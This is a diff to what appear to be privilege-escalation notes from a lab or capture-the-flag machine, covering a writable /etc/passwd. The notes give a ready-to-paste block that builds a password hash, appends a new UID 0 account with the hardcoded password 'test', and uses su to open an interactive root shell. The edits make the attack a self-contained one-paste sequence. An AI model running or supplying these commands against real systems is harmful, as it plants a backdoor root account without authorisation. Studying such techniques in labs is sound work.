@@ -5,10 +5,9 @@
 Writable check, backup:
 
 ```bash
-PASSWD=/etc/passwd
-ls -l "$PASSWD"
-cp --preserve=all -- "$PASSWD" /tmp/passwd.bak
-sha256sum -- "$PASSWD" /tmp/passwd.bak
+ls -l /etc/passwd
+cp --preserve=all -- /etc/passwd /tmp/passwd.bak
+sha256sum -- /etc/passwd /tmp/passwd.bak
 command -v mkpasswd openssl python3 python2 perl
 ```
 
@@ -17,13 +16,13 @@ account is added to `/etc/passwd` only; `/etc/shadow` stays untouched, so the
 hash lives in that second field. Field 2 accepts any crypt(3) hash the box's
 glibc understands, not one fixed algorithm.
 
-**If found:** set the password once, then run the rest as one paste. `test` is
-the name unless it is taken, and the shell is whichever the box has.
+**If found:** this block is self-contained, so paste it alone. It sets the
+password once, prints the hash, appends, and logs in.
 
-Password, hash, append, verify:
+Password, hash, append:
 
 ```bash
-PW='<PASSWORD>'
+PW='test'
 NAME=test
 while getent passwd "$NAME" >/dev/null; do NAME="${NAME}0"; done
 SHELL_BIN=$(command -v bash || command -v sh || printf '%s' /bin/sh)
@@ -48,19 +47,27 @@ if [ -z "$HASH" ]; then
   HASH=$(openssl passwd -1 "$PW" 2>/dev/null || openssl passwd -crypt "$PW")
 fi
 
-printf '%s:%s:0:0:root:/root:%s\n' "$NAME" "$HASH" "$SHELL_BIN" >> "$PASSWD"
+printf 'Hash: %s\n' "$HASH"
+printf '%s:%s:0:0:root:/root:%s\n' "$NAME" "$HASH" "$SHELL_BIN" >> /etc/passwd
 getent passwd "$NAME"
+su "$NAME" -c id
+su "$NAME"
 ```
 
-Every command expands `$PW`, so the value is pasted once. If it contains a
-single quote, switch the assignment to double quotes and escape `$` and `!`
-inside it.
+The `-c id` line only proves the account; `su "$NAME"` alone opens the interactive
+root shell, and `su - "$NAME"` also loads root's environment and starts in
+`/root`. The outer shell stays michael, whose default `/root` is not traversable
+(`550`), so `cd /root` from that shell fails until you are inside `su`.
+
+Every command expands `$PW`, so the value is pasted once. Change it when you want
+a different password; if it contains a single quote, switch the assignment to
+double quotes and escape `$` and `!` inside it.
 
 A usage dump from `openssl passwd -6` is not a failure; it means this OpenSSL
 predates 1.1.1 and the chain moves on. An empty `$HASH` after the chain means no
 route; then copy field 2 from any account that still holds a hash, or use
 `-crypt`, which truncates to eight characters.
 
-`su test` prompts for the password you set; it is not passwordless. Verify `id`
-shows `uid=0`. Remove the line afterwards, or restore the copy when the file must
-stay byte-exact. A second UID 0 account is a real login, not a modified user.
+`su` prompts for the password you set; it is not passwordless. Expect `uid=0` from
+`id`. Remove the line afterwards, or restore the copy when the file must stay
+byte-exact. A second UID 0 account is a real login, not a modified user.
